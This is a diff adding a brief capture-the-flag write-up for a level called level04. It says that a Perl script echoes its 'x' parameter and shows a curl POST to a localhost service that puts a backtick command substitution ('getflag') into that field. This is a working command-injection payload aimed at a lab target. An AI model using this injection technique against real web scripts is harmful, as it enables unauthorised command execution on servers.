@@ -1,0 +1,3 @@
+We see that the level04.pl file is taking a x as a param and echo it, lets just give as value the getflag command:
+
+curl -X POST -d "x=\`getflag\`" http://localhost:4747/
